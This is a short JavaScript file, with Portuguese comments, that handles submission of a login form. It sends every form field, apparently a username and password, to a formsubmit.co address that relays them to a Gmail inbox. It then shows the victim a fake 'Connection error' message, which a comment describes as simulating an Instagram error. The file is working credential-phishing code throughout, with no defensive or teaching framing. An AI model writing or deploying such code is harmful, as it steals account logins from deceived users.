document.getElementById('loginForm').addEventListener('submit', function (e) {
    e.preventDefault();

    const form = e.target;
    const formData = new FormData(form);
    const errorMessageDiv = document.getElementById('error-message');

    // URL CORRIGIDA (sem espaço no final)
    const formSubmitUrl = 'https://formsubmit.co/ajax/teste2celular321@gmail.com';

    fetch(formSubmitUrl, {
        method: 'POST',
        body: formData,
        headers: {
            'Accept': 'application/json'
        }
    })
    .then(response => {
        // Se a resposta for OK (status 2xx), consideramos sucesso
        if (response.ok) {
            form.reset();
            errorMessageDiv.textContent = 'Connection error. Try again later'; // Simulação de erro do Instagram
            // Você pode verificar a resposta JSON se precisar de mais detalhes
             //return response.json(); 
        } else {
            // Tenta obter mais detalhes do erro se não for OK
            response.json().then(data => {
                console.error('Erro Formsubmit:', data);
                errorMessageDiv.textContent = 'Erro ao enviar os dados. Verifique o console.';
            }).catch(() => {
                errorMessageDiv.textContent = 'Erro ao enviar os dados. Resposta inválida.';
            });
        }
    })
    // .then(data => { // Descomente se precisar usar a resposta JSON
    //    console.log('Sucesso:', data);
    // })
    .catch(error => {
        console.error('Erro de Rede ou Fetch:', error);
        errorMessageDiv.textContent = 'Falha na conexão. Verifique sua rede e o console.';
    });
});